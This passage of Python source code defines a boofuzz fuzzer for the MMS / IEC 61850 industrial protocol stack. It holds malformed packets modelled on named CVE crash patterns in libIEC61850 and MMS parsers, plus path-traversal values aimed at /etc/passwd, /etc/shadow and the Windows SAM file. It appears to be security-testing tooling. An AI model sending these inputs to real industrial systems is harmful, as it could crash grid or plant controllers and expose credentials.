            # proposedDataStructureNestingLevel (drives recursive-decode depth)
            {"nesting_level": b"\x00"},  # zero nesting
            {"nesting_level": b"\xff"},  # 255 nesting
            {"nesting_level": b"\x7f\xff\xff\xff"},  # oversized nesting
            # service-support bitstring: illegal unused-bits octet (>7) + length lie
            {"proposed_cbb": b"\x08\xff", "services_supported": b"\x08\xff"},
            {"services_supported": b"\x81\xff\xc0"},  # bitstring BER length lie
        ]
        packets: List[bytes] = []
        for mutation in mutations:
            pdu = self._create_fuzzable_initiate_pdu(**mutation)
            if self.use_osi_stack:
                packets.append(self.osi_stack.build_initiate_request(pdu))
            else:
                packets.append(pdu)
        return packets

    def _wrap_with_osi_stack(self, mms_pdu: bytes, is_initiate: bool = False) -> bytes:
        """
        Wrap MMS PDU with complete OSI stack.

        Args:
            mms_pdu: Raw MMS PDU bytes
            is_initiate: True if this is an Initiate Request (needs full stack)

        Returns:
            Complete packet with TPKT + COTP + (Session + Presentation + ACSE) + MMS
        """
        if not self.use_osi_stack:
            # Legacy mode: just return raw MMS PDU
            return mms_pdu

        if is_initiate:
            # Use full OSI stack for association establishment
            return self.osi_stack.build_initiate_request(mms_pdu)
        else:
            # Data transfer: use simplified stack (TPKT + COTP only)
            return self.osi_stack.build_data_transfer(mms_pdu)

    def _create_wrapped_request(self, name: str, mms_pdu: bytes) -> Request:
        """
        Create a boofuzz Request with MMS PDU wrapped in OSI stack.

        Args:
            name: Request name
            mms_pdu: Raw MMS PDU bytes

        Returns:
            boofuzz Request object with properly wrapped packet
        """
        if self.use_osi_stack:
            # Wrap the MMS PDU in TPKT + COTP headers
            wrapped_pdu = wrap_in_tpkt_cotp(mms_pdu)
            return Request(
                name=name,
                children=(SmartBytes(name=f"{name}_wrapped_pdu", default_value=wrapped_pdu)),
            )
        else:
            # Legacy mode: send raw MMS PDU
            return Request(
                name=name,
                children=(SmartBytes(name=f"{name}_raw_pdu", default_value=mms_pdu)),
            )

    def _add_osi_layer_tests(self):
        """
        Add OSI layer-specific fuzzing tests (COTP, Session, Presentation, ACSE).

        These tests target the protocol stack layers to improve coverage
        of COTP, Session, Presentation, and ACSE implementations.
        """
        if not self.use_osi_stack:
            return  # Skip if OSI stack disabled

        # COTP Layer Attacks
        # Invalid COTP TPDU types
        cotp_invalid_req = Request(
            name="cotp_invalid_tpdu",
            children=(
                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x07"),  # TPKT
                Group(
                    name="cotp_invalid_type",
                    values=[
                        b"\x02\xaa",  # Invalid TPDU type 0xAA
                        b"\x02\xee",  # Invalid TPDU type 0xEE
                        b"\x02\xff",  # Invalid TPDU type 0xFF
                        b"\x7f\xe0\x00",  # Oversized length with CR
                        b"\x00\xf0",  # Zero length with DT
                    ],
                ),
            ),
        )
        self.session.connect(cotp_invalid_req)

        # COTP Connection Request fuzzing
        cotp_cr_req = Request(
            name="cotp_connection_attacks",
            children=(
                Static(name="tpkt_cr_header", default_value=b"\x03\x00\x00\x16"),  # TPKT
                Byte(name="cotp_cr_length", default_value=0x11, fuzzable=True),
                Static(name="cotp_cr_type", default_value=b"\xe0"),  # CR TPDU
                Word(name="cotp_dst_ref", default_value=0, endian=">"),
                Word(name="cotp_src_ref", default_value=1, endian=">"),
                Byte(name="cotp_class", default_value=0, fuzzable=True),
                # Variable part
                SmartBytes(name="cotp_cr_params", size=10, fuzzable=True),
            ),
        )
        self.session.connect(cotp_cr_req)

        # Session Layer Attacks
        # Invalid Session SPDU types
        session_invalid_req = Request(
            name="session_invalid_spdu",
            children=(
                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x08"),
                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),  # COTP DT
                Group(
                    name="session_invalid_type",
                    values=[
                        b"\xff",  # Invalid SPDU type
                        b"\x00",  # Null SPDU
                        b"\x20",  # Reserved SPDU
                        b"\x0d\x00",  # CONNECT with zero length
                        b"\x09\xff" + b"\x00" * 255,  # FINISH with max length
                    ],
                ),
            ),
        )
        self.session.connect(session_invalid_req)

        # Presentation Layer Attacks
        # Invalid Presentation CP-type
        pres_invalid_req = Request(
            name="presentation_attacks",
            children=(
                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x10"),
                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
                Static(name="session_give_tokens", default_value=b"\x01\x00"),
                Group(
                    name="presentation_invalid",
                    values=[
                        b"\x30\xff",  # Invalid length encoding
                        b"\x31\x05\xa0\x03\x80\x01\x01",  # CP-type with wrong tag
                        b"\x30\x00",  # Empty CP-type
                        b"\x30\x7f" + b"\x00" * 127,  # Max short form length
                    ],
                ),
            ),
        )
        self.session.connect(pres_invalid_req)

        # ACSE Layer Attacks
        # Malformed AARQ (Associate Request)
        acse_aarq_req = Request(
            name="acse_aarq_attacks",
            children=(
                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x12"),
                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
                Static(name="session_give_tokens", default_value=b"\x01\x00"),
                Static(name="pres_cp_header", default_value=b"\x30\x05"),
                Group(
                    name="acse_aarq_invalid",
                    values=[
                        b"\x60\xff",  # AARQ with invalid length
                        b"\x61\x03\xa0\x01\x00",  # AARE instead of AARQ
                        b"\x60\x00",  # Empty AARQ
                        b"\x60\x0a\xa1\x08\x06\x06\x2a\x86\x48\xce\x3d\x00",  # Invalid OID
                        b"\x60\x10" + b"\xa0" * 16,  # Nested context tags
                    ],
                ),
            ),
        )
        self.session.connect(acse_aarq_req)

        # ACSE Release Request fuzzing
        acse_rlrq_req = Request(
            name="acse_release_attacks",
            children=(
                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x0c"),
                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
                Group(
                    name="acse_rlrq_data",
                    values=[
                        b"\x62\x00",  # Empty RLRQ
                        b"\x62\x03\x80\x01\x00",  # RLRQ with reason=0 (normal)
                        b"\x62\x03\x80\x01\xff",  # RLRQ with invalid reason
                        b"\x63\x03\x80\x01\x00",  # RLRE (response) instead of request
                    ],
                ),
            ),
        )
        self.session.connect(acse_rlrq_req)

        # Combined layer attacks (stress testing)
        combined_req = Request(
            name="osi_combined_attacks",
            children=(
                # Valid TPKT but invalid everything else
                Static(name="tpkt_ok", default_value=b"\x03\x00"),
                Word(name="tpkt_length", default_value=100, endian=">"),
                SmartBytes(name="osi_garbage", size=96, max_len=1000, fuzzable=True),
            ),
        )
        self.session.connect(combined_req)

        self.log.debug("[MMS] Added OSI layer-specific fuzzing tests")

    def _define_protocol(self):
        """Define the MMS protocol messages for fuzzing

        OPTIMIZED REQUEST ORDERING for breadth-first coverage:
        - Phase 1: Quick Service Sweep (~30 sec) - All 9 MMS services once
        - Phase 2: High-Crash Tests (~3 min) - Buffer overflow, ASN.1, OSI
        - Phase 3: CVE-Targeted Operations (~3 min) - Write, Control, File
        - Phase 4: Boundary Attacks (~3 min) - Invoke ID, length, encoding
        - Phase 5: Everything Else - Reads, reports, session management
        """

        # ================================================================
        # REQUEST DEFINITIONS (define all requests before connecting)
        # ================================================================

        # PHASE 1: Quick Service Sweep - touch all MMS services once
        # Goal: Maximum breadth coverage in first 30 seconds
        quick_service_coverage = Request(
            name="Quick_Service_Coverage",
            children=(
                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x10"),
                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
                Group(
                    name="mms_service_type",
                    values=[
                        # All 9 MMS confirmed service types in one sweep
                        self.SERVICE_READ,  # [4] Read
                        self.SERVICE_WRITE,  # [5] Write
                        self.SERVICE_GET_VARIABLE_ACCESS_ATTRIBUTES,  # [7] GetVarAccessAttr
                        self.SERVICE_GET_NAME_LIST,  # [1] GetNameList
                        self.SERVICE_IDENTIFY,  # [2] Identify
                        self.SERVICE_FILE_OPEN,  # [72] FileOpen
                        self.SERVICE_FILE_READ,  # [73] FileRead
                        self.SERVICE_FILE_CLOSE,  # [74] FileClose
                        self.SERVICE_FILE_DIRECTORY,  # [77] FileDirectory
                    ],
                ),
                # Minimal valid params for most services
                Bytes(
                    name="minimal_params", default_value=b"\x00\x00\x00\x01", size=4, fuzzable=False
                ),
            ),
        )

        # Baseline read for connectivity check (fuzzable=True ensures packet sent)
        read_pdu = self._create_read_request()
        baseline_read_req = self._create_wrapped_request("baseline_read", read_pdu)

        # PHASE 2: High-Crash Tests (moved up from late positions)
        # Buffer overflow - CVE-2015-6574 pattern (heap overflow in MMS parsing)
        overflow_req = Request(
            name="buffer_overflow",
            children=(
                Static(
                    name="overflow_pdu_header",
                    default_value=bytes([self.PDU_CONFIRMED_REQUEST, 0x82, 0xFF, 0xFF]),
                ),
                SmartString(
                    name="overflow_string", default_value="mms-overflow-string", max_len=65535
                ),
            ),
        )

        # Large PDU overflow - triggers stack/heap exhaustion
        large_pdu_overflow = Request(
            name="large_pdu_overflow",
            children=(
                Static(name="pdu_type", default_value=bytes([self.PDU_CONFIRMED_REQUEST])),
                Group(
                    name="length_overflow",
                    values=[
                        b"\x82\x10\x00",  # 4096 bytes
                        b"\x82\x40\x00",  # 16384 bytes
                        b"\x82\xff\xff",  # 65535 bytes
                        b"\x83\x01\x00\x00",  # 65536 bytes (long form)
                        b"\x84\xff\xff\xff\xff",  # Maximum 32-bit length
                    ],
                ),
                SmartBytes(name="large_payload", size=1000, max_len=65535, fuzzable=True),
            ),
        )

        # ASN.1/BER encoding attacks - common crash vector
        asn1_req = Request(
            name="asn1_attacks",
            children=(
                Group(
                    name="length_attacks",
                    values=[
                        b"\xa0\x84\xff\xff\xff\xff",  # Indefinite length (4-byte form)
                        b"\xa0\x83\x00\x00\x00",  # Invalid long form (3-byte)
                        b"\xa0\x82\xff\xff",  # Length overflow (2-byte)
                        b"\xa0\x81\xff",  # Length at boundary (1-byte)
                        b"\xa0\x80",  # Indefinite length marker
                        b"\xa0\x00",  # Zero length
                    ],
                ),
                Static(name="nested_sequences", default_value=b"\x30\x02\x30\x00" * 10),
            ),
        )

        # Deep nesting attack - stack exhaustion
        nested_depth_attack = Request(
            name="nested_depth_attack",
            children=(
                # Deeply nested SEQUENCE structures (100 levels)
                Static(name="deep_nest", default_value=b"\x30\x80" * 100 + b"\x00\x00" * 100)
            ),
        )

        # BER outer-tag confusion - swap SEQUENCE (0x30) for SET / context-specific tags.
        # High-yield ASN.1 parser bug class: decoders that assume SEQUENCE often
        # mis-dispatch on SET (0x31), primitive context tags (0x80), or
        # constructed context tags (0xA0/0xA1) and over/under-read the body.
        # See ref/mms/cve_patterns.json#mms-asn1-tag-confusion.
        ber_tag_confusion_template = self._create_read_request()
        ber_tag_confusion_body = (
            encode_ber_length(len(ber_tag_confusion_template)) + ber_tag_confusion_template
        )
        ber_tag_confusion_req = Request(
            name="ber_tag_confusion",
            children=(
                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x10"),
                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
                Group(
                    name="outer_sequence_tag",
                    values=[
                        b"\x30",  # SEQUENCE (baseline, valid)
                        b"\x31",  # SET (constructed)
                        b"\x80",  # [0] primitive context-specific
                        b"\xa0",  # [0] constructed context-specific
                        b"\xa1",  # [1] constructed context-specific
                        b"\xc0",  # [0] primitive private
                        b"\xe0",  # [0] constructed private
                    ],
                ),
                Static(name="ber_tag_confusion_body", default_value=ber_tag_confusion_body),
            ),
        )

        # OSI layer attacks are defined in _add_osi_layer_tests()
        # They will be added inline for proper ordering

        # PHASE 3: CVE-Targeted Operations
        # Write operations - primary CVE target (CVE-2019-6604, CVE-2015-6574)
        write_pdu = self._create_write_request()
        write_req = self._create_wrapped_request("write_request", write_pdu)

        # Write with oversized data value
        write_overflow = Request(
            name="write_overflow",
            children=(
                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x10"),
                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
                Static(name="write_service", default_value=self.SERVICE_WRITE),
                Group(
                    name="write_overflow_data",
                    values=[
                        b"\x00" * 256,  # 256 byte write value
                        b"\x00" * 1024,  # 1KB write value
                        b"\x00" * 4096,  # 4KB write value
                        b"\xff" * 8192,  # 8KB write value (max pattern)
                    ],
                ),
            ),
        )

        # Control operations - IEC 61850 CVE target (CVE-2019-6604)
        if self.config.get_option("control_model", 0) == 1:  # SBO
            select_pdu = self._create_control_request(operation="select")
            control_select_req = self._create_wrapped_request("control_select", select_pdu)
            operate_pdu = self._create_control_request(operation="operate")
            control_operate_req = self._create_wrapped_request("control_operate", operate_pdu)
        else:
            direct_pdu = self._create_control_request(operation="operate")
            control_direct_req = self._create_wrapped_request("control_direct", direct_pdu)

        # Control with invalid AddCause codes
        control_addcause_attack = Request(
            name="control_addcause_attack",
            children=(
                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x14"),
                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
                Static(name="control_header", default_value=self.SERVICE_WRITE),
                Group(
                    name="addcause_values",
                    values=[
                        struct.pack(">B", 0),  # UNKNOWN
                        struct.pack(">B", 255),  # Invalid
                        struct.pack(">B", 128),  # Reserved range
                        struct.pack(">H", 65535),  # Multi-byte (invalid encoding)
                    ],
                ),
                SmartBytes(name="control_data", size=20, fuzzable=True),
            ),
        )

        # File services - directory traversal and path injection
        file_pdu = self._create_file_open_request()
        file_open_req = self._create_wrapped_request("file_open", file_pdu)

        file_traversal = Request(
            name="file_traversal_attack",
            children=(
                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x20"),
                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
                Static(name="file_service", default_value=self.SERVICE_FILE_OPEN),
                Group(
                    name="traversal_paths",
                    values=[
                        b"../../../etc/passwd",
                        b"..\\..\\..\\windows\\system32\\config\\sam",
                        b"/etc/shadow",
                        b"C:\\Windows\\System32\\drivers\\etc\\hosts",
                        b"....//....//....//etc/passwd",  # Bypass filter
                        b"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
                        b"\x00/etc/passwd",  # Null byte injection
                    ],
                ),
            ),
        )

        # PHASE 4: Boundary Attacks
        # Invoke ID boundary testing
        invoke_id_req = Request(
            name="invoke_id_attacks",
            children=(
                Static(name="invoke_pdu_type", default_value=bytes([self.PDU_CONFIRMED_REQUEST])),
                Size(
                    name="size_of_invoke_attacks",
                    block_name="invoke_id_data",
                    length=1,
                    fuzzable=True,
                ),
                Block(
                    name="invoke_id_data",
                    children=(
                        Group(
                            name="invoke_values",
                            values=[
                                encode_ber_integer(0),
                                encode_ber_integer(-1),
                                encode_ber_integer(2147483647),  # Max int32
                                encode_ber_integer(-2147483648),  # Min int32
                                b"\x02\x00",  # Empty integer
                                b"\x02\x09\x00\xff\xff\xff\xff\xff\xff\xff\xff",  # 9-byte integer
                                encode_ber_integer(4294967295),  # Max uint32
                            ],
                        ),
                    ),
                ),
            ),
        )

        # IEC 61850 specific attacks
        iec61850_req = Request(
            name="iec61850_attacks",
            children=(
                SmartString(name="bad_fc", default_value="$XX$", size=4, fuzzable=True),
                Delim(name="object_ref", default_value="$", fuzzable=True),
                Group(
                    name="add_cause",
                    values=[
                        struct.pack(">B", self.ADD_CAUSE_LOCKED_BY_OTHER_CLIENT),
                        struct.pack(">B", 255),
                        struct.pack(">H", 65535),
                    ],
                ),
            ),
        )

        # Malformed PDU types
        malformed_req = Request(
            name="malformed_pdu",
            children=(
                Group(
                    name="bad_pdu_type",
                    values=[
                        b"\xaf\x10",  # Invalid PDU type 0xAF
                        b"\xa0\xff",  # Confirmed request with invalid length
                        b"\xa1\x00",  # Empty confirmed response
                        b"\xa4\x7f" + b"\x00" * 127,  # Reject with max short length
                        b"\xae\x10",  # Invalid PDU type 0xAE
                        b"\xb0\x10",  # Invalid PDU type 0xB0
                    ],
                ),
                SmartBytes(name="garbage_data", size=100, max_len=1000, fuzzable=True),
            ),
        )

        # PDU type boundary testing
        pdu_type_boundary = Request(
            name="pdu_type_boundary",
            children=(
                Group(
                    name="pdu_boundary_types",
                    values=[
                        bytes([x])
                        for x in range(0xA0, 0xB0)  # All context tags 0-15
                    ],
                ),
                Byte(name="pdu_length", default_value=0x10),
                SmartBytes(name="pdu_content", size=14, fuzzable=True),
            ),
        )

        # PHASE 5: Everything Else
        # Read operations
        read_req = self._create_wrapped_request("read_request", read_pdu)

        namelist_pdu = self._create_get_namelist_request()
        namelist_req = self._create_wrapped_request("get_namelist", namelist_pdu)

        identify_pdu = self._create_identify_request()
        identify_req = self._create_wrapped_request("identify", identify_pdu)

        # Information Reports
        report_pdu = self._create_information_report()
        report_req = self._create_wrapped_request("info_report", report_pdu)

        # Session management PDUs
        session_req = Request(
            name="session_mgmt",
            children=(
                Group(name="session_pdu", values=[bytes([x]) for x in range(0xA8, 0xAE)]),
                Size(name="session_size", block_name="session_data", length=2, endian=">"),
                SmartBytes(name="session_data", size=50, fuzzable=True),
            ),
        )

        # ================================================================
        # ACSE AUTHENTICATION REQUESTS
        # Uses SmartString CREDENTIAL for password/username fuzzing
        # ================================================================

        # Get authentication credentials from options
        mms_username = self.config.get_option("mms_username", "") or "operator"
        mms_password = self.config.get_option("mms_password", "") or "password"

        # ACSE AARQ with authentication value (password mechanism)
        # ACSE Application[0] = 0x60 for AARQ
        # Authentication-value is context[6] in AARQ
        acse_auth_aarq = Request(
            name="acse_auth_aarq",
            children=(
                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x40"),  # TPKT
                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),  # COTP DT
                Static(name="session_connect", default_value=b"\x0d\x00"),  # Session CONNECT SPDU
                Static(name="pres_cp", default_value=b"\x30\x30"),  # Presentation CP-type
                # ACSE AARQ with authentication
                Static(name="aarq_tag", default_value=b"\x60"),  # AARQ tag
                Byte(name="aarq_length", default_value=0x2C),
                # Application Context Name (context[1])
                Static(
                    name="app_context",
                    default_value=b"\xa1\x09\x06\x07\x28\xca\x22\x02\x03\x00\x01",
                ),
                # Authentication mechanism name (context[6]) - OID 2.5.4.3 (commonName)
                Static(name="auth_mech_tag", default_value=b"\xa6\x09\x06\x07"),
                Static(
                    name="auth_mech_oid", default_value=b"\x55\x04\x03\x00\x00\x00\x00"
                ),  # OID for password
                # Authentication value (context[7]) - EXTERNAL type with username/password
                Static(name="auth_value_tag", default_value=b"\xa7"),
                Byte(name="auth_value_len", default_value=0x18),
                # Username - use SmartString CREDENTIAL
                Static(name="username_tag", default_value=b"\x80"),
                SmartString(
                    name="acse_username",
                    default_value=mms_username,
                    max_len=32,
                    context=StringContext.CREDENTIAL,
                ),
                # Password - use SmartString CREDENTIAL
                Static(name="password_tag", default_value=b"\x81"),
                SmartString(
                    name="acse_password",
                    default_value=mms_password,
                    max_len=32,
                    context=StringContext.CREDENTIAL,
                ),
            ),
        )

        # ACSE AARQ with various authentication mechanism OIDs
        acse_auth_mechanisms = Request(
            name="acse_auth_mechanisms",
            children=(
                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x30"),
                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
                Static(name="aarq_header", default_value=b"\x60\x20"),
                Static(
                    name="app_context",
                    default_value=b"\xa1\x09\x06\x07\x28\xca\x22\x02\x03\x00\x01",
                ),
                # Try different authentication mechanism OIDs
                Static(name="auth_mech_tag", default_value=b"\xa6"),
                Group(
                    name="auth_mechanism_oid",
                    values=[
                        b"\x09\x06\x07\x55\x04\x03\x00\x00\x00\x00",  # X.500 DN
                        b"\x09\x06\x07\x2a\x86\x48\x86\xf7\x0d\x01",  # RSA PKCS#1
                        b"\x09\x06\x07\x2a\x86\x48\xce\x3d\x02\x01",  # ECDSA
                        b"\x09\x06\x07\x55\x08\x02\x01\x00\x00\x00",  # X.509 PKI
                        b"\x03\x06\x01\x00",  # Short/invalid OID
                        b"\x0a\x06\x08" + b"\xff" * 8,  # Long invalid OID
                    ],
                ),
                # Authentication value with credentials
                Static(name="auth_value_tag", default_value=b"\xa7\x10"),
                SmartString(
                    name="auth_credential",
                    default_value=mms_password,
                    max_len=16,
                    context=StringContext.CREDENTIAL,
                ),
            ),
        )

        # ACSE authentication with certificate-like structures
        acse_cert_auth = Request(
            name="acse_certificate_auth",
            children=(
                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x50"),
                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
                Static(name="aarq_header", default_value=b"\x60\x40"),
                Static(
                    name="app_context",
                    default_value=b"\xa1\x09\x06\x07\x28\xca\x22\x02\x03\x00\x01",
                ),
                # Certificate authentication mechanism
                Static(
                    name="cert_auth_mech",
                    default_value=b"\xa6\x09\x06\x07\x2a\x86\x48\xce\x3d\x02\x01",
                ),
                # Certificate value (EXTERNAL with embedded certificate data)
                Static(name="cert_value_tag", default_value=b"\xa7\x30\x30\x2e"),
                # Subject name - use SmartString CREDENTIAL
                Static(
                    name="subject_tag",
                    default_value=b"\x30\x10\x31\x0e\x30\x0c\x06\x03\x55\x04\x03\x14",
                ),
                SmartString(
                    name="cert_subject",
                    default_value=mms_username,
                    max_len=16,
                    context=StringContext.CREDENTIAL,
                ),
                # Signature value (fuzzing target)
                Static(name="sig_tag", default_value=b"\x03\x1a\x00"),
                SmartBytes(name="cert_signature", size=24, max_len=256, fuzzable=True),
            ),
        )

        # ACSE authentication with malformed structures (boundary/error testing)
        acse_auth_malformed = Request(
            name="acse_auth_malformed",
            children=(
                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x20"),
                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
                Static(name="aarq_header", default_value=b"\x60\x10"),
                Group(
                    name="malformed_auth",
                    values=[
                        # Empty authentication value
                        b"\xa6\x00\xa7\x00",
                        # Authentication mechanism without value
                        b"\xa6\x09\x06\x07\x55\x04\x03\x00\x00\x00\x00",
                        # Authentication value without mechanism
                        b"\xa7\x08password",
                        # Oversized authentication value length
                        b"\xa6\x03\x06\x01\x00\xa7\xff" + b"A" * 10,
                        # Nested authentication structures
                        b"\xa6\x0a\xa6\x08\x06\x06\x55\x04\x03\x00\x00\x00",
                        # Invalid context tag for auth
                        b"\xa8\x08\x06\x06\x55\x04\x03\x00\x00\x00",  # Wrong context tag
                    ],
                ),
                SmartString(
                    name="auth_fuzz_data",
                    default_value=mms_password,
                    max_len=32,
                    context=StringContext.CREDENTIAL,
                ),
            ),
        )

        # ================================================================
        # NAMED VARIABLE LIST + TYPE-AWARE DATA-VALUE CRASH REQUESTS
        # ================================================================

        # DeleteNamedVariableList [14] - CVE-2024-26529 DoS in
        # mmsServer_handleDeleteNamedVariableListRequest. Malformed/absent
        # VariableListName combined with a scopeOfDelete sweep over
        # {specific, aa-specific, domain, invalid}.
        # DeleteNamedVariableList-Request ::= [14] IMPLICIT SEQUENCE {
        #   scopeOfDelete          [0] IMPLICIT INTEGER OPTIONAL,
        #   listOfVariableListName [1] IMPLICIT SEQUENCE OF ObjectName OPTIONAL,
        #   domainName             [2] IMPLICIT Identifier OPTIONAL }
        delete_nvl_req = Request(
            name="MMS_DeleteNamedVariableList",
            children=(
                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x10"),
                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
                Static(name="pdu_tag", default_value=bytes([self.PDU_CONFIRMED_REQUEST])),
                Static(name="pdu_len", default_value=b"\x81\xff"),  # length lie
                Static(name="invoke_id", default_value=encode_ber_integer(1)),
                # deleteNamedVariableList [14] IMPLICIT SEQUENCE
                Static(name="service_tag", default_value=self.SERVICE_DELETE_NAMED_VARIABLE_LIST),
                Static(name="service_len", default_value=b"\x0a"),
                # scopeOfDelete [0] IMPLICIT INTEGER
                Static(name="scope_tag", default_value=b"\x80\x01"),
                Group(
                    name="scope_of_delete",
                    values=[
                        b"\x00",  # specific
                        b"\x01",  # aa-specific
                        b"\x02",  # domain
                        b"\xff",  # invalid (out of enum range)
                    ],
                ),
                # listOfVariableListName [1] - malformed / absent
                Group(
                    name="variable_list_name",
                    values=[
                        b"",  # absent VariableListName (null-deref path)
                        b"\xa1\x00",  # empty SEQUENCE OF
                        b"\xa1\x02\xa0\x00",  # ObjectName with empty body
                        b"\xa1\x81\xff",  # length lie, no content (over-read)
                    ],
                ),
            ),
        )

        # DefineNamedVariableList [12] with an oversized listOfVariable.
        define_nvl_req = Request(
            name="MMS_DefineNamedVariableList",
            children=(
                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x10"),
                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
                Static(name="pdu_tag", default_value=bytes([self.PDU_CONFIRMED_REQUEST])),
                Static(name="pdu_len", default_value=b"\x82\xff\xff"),  # length lie
                Static(name="invoke_id", default_value=encode_ber_integer(1)),
                # defineNamedVariableList [12] IMPLICIT SEQUENCE
                Static(name="service_tag", default_value=self.SERVICE_DEFINE_NAMED_VARIABLE_LIST),
                Static(name="service_len", default_value=b"\x82\xff\xff"),  # length lie
                # variableListName ObjectName [0]
                Static(
                    name="var_list_name",
                    default_value=encode_ber_context_tag(0, b"FUZZLIST", False),
                ),
                # listOfVariable [1] SEQUENCE OF - claims 65535 bytes
                Static(name="list_of_variable_tag", default_value=b"\xa1\x82\xff\xff"),
                SmartBytes(
                    name="oversized_list_of_variable", size=512, max_len=8192, fuzzable=True
                ),
            ),
        )

        # MMS_BIT_STRING [4] write value - CVE-2020-7054 heap overflow in
        # MmsValue_decodeMmsData: illegal unused-bits leading octet (>7) and a
        # declared length larger than the payload bytes present.
        bitstr_var_spec = self._create_variable_specification()
        bitstring_req = Request(
            name="MMS_BitString_UnusedBits",
            children=(
                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x10"),
                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
                Static(name="pdu_tag", default_value=bytes([self.PDU_CONFIRMED_REQUEST])),
                Static(name="pdu_len", default_value=b"\x81\xa0"),
                Static(name="invoke_id", default_value=encode_ber_integer(1)),
                Static(name="service_tag", default_value=self.SERVICE_WRITE),
                Static(name="service_len", default_value=b"\x81\x90"),
                # variableAccessSpecification [0]
                Static(name="var_spec", default_value=bitstr_var_spec),
                # listOfData [0]
                Static(name="list_of_data_tag", default_value=b"\xa0"),
                Static(name="list_of_data_len", default_value=b"\x0a"),
                # MMS_BIT_STRING [4] primitive
                Static(name="bitstring_tag", default_value=b"\x84"),
                # BER length larger than the bytes actually present (over-read)
                Group(
                    name="bitstring_ber_len",
                    values=[
                        b"\x81\xff",  # claims 255 bytes, payload is 1
                        b"\x20",  # claims 32 bytes
                        b"\x7f",  # claims 127 bytes
                        b"\x82\x0f\xff",  # claims 4095 bytes (long form)
                    ],
                ),
                # unused-bits leading octet: legal range is 0..7, so >7 is illegal
                Group(
                    name="unused_bits_octet",
                    values=[
                        b"\x08",  # illegal (>7)
                        b"\x09",  # illegal (>7)
                        b"\x40",  # illegal (>7)
                        b"\xff",  # illegal (>7, max)
                        b"\x00",  # legal boundary
                    ],
                ),
                # single payload octet (fewer than the length claims)
                Static(name="bitstring_payload", default_value=b"\xc0"),
            ),
        )

        # MMS_OCTET_STRING [9] write value with a BER length larger than the
        # octets present, truncated at the tail (over-read).
        octstr_var_spec = self._create_variable_specification()
        octetstring_req = Request(
            name="MMS_OctetString_Length_Lie",
            children=(
                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x10"),
                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
                Static(name="pdu_tag", default_value=bytes([self.PDU_CONFIRMED_REQUEST])),
                Static(name="pdu_len", default_value=b"\x81\xa0"),
                Static(name="invoke_id", default_value=encode_ber_integer(1)),
                Static(name="service_tag", default_value=self.SERVICE_WRITE),
                Static(name="service_len", default_value=b"\x81\x90"),
                Static(name="var_spec", default_value=octstr_var_spec),
                Static(name="list_of_data_tag", default_value=b"\xa0"),
                Static(name="list_of_data_len", default_value=b"\x0a"),
                # MMS_OCTET_STRING [9] primitive
                Static(name="octetstring_tag", default_value=b"\x89"),
                # BER length larger than the octets that follow
                Group(
                    name="octetstring_len_lie",
                    values=[
                        b"\x40",  # claims 64, only 4 present
                        b"\x81\xff",  # claims 255
                        b"\x82\x0f\xff",  # claims 4095
                        b"\x84\x7f\xff\xff\xff",  # claims ~2GB (32-bit)
                    ],
                ),
                # truncated tail: far fewer octets than declared
                Static(name="octetstring_truncated", default_value=b"\x01\x02\x03\x04"),
            ),
        )

        # Deeply nested MMS structured/array data value - recursive decode-depth
        # probe. MMS_STRUCTURE = [2] constructed (0xa2), MMS_ARRAY = [1] (0xa1).
        nesting_var_spec = self._create_variable_specification()
        structured_nesting_req = Request(
            name="MMS_Structured_Nesting",
            children=(
                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x10"),
                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
                Static(name="pdu_tag", default_value=bytes([self.PDU_CONFIRMED_REQUEST])),
                Static(name="pdu_len", default_value=b"\x82\xff\xff"),
                Static(name="invoke_id", default_value=encode_ber_integer(1)),
                Static(name="service_tag", default_value=self.SERVICE_WRITE),
                Static(name="service_len", default_value=b"\x82\xff\xff"),
                Static(name="var_spec", default_value=nesting_var_spec),
                Static(name="list_of_data_tag", default_value=b"\xa0\x82\xff\xff"),
                # nested SEQUENCE / structure / array tags (indefinite length)
                Group(
                    name="nesting_pattern",
                    values=[
                        b"\xa2\x80" * 64,  # 64 nested MMS structures (indefinite)
                        b"\xa1\x80" * 64,  # 64 nested MMS arrays (indefinite)
                        b"\x30\x80" * 64,  # 64 nested SEQUENCEs (indefinite)
                        (b"\xa2\x02") * 64,  # 64 nested definite-length structures
                    ],
                ),
                Static(name="nesting_terminators", default_value=b"\x00\x00" * 64),
            ),
        )

        # ================================================================
        # libIEC61850 1.0.0-1.6.1 REAL-CRASH REQUESTS
        # (CISA ICSA-26-204-06 / ICSA-26-211-10, Talos)
        # ================================================================

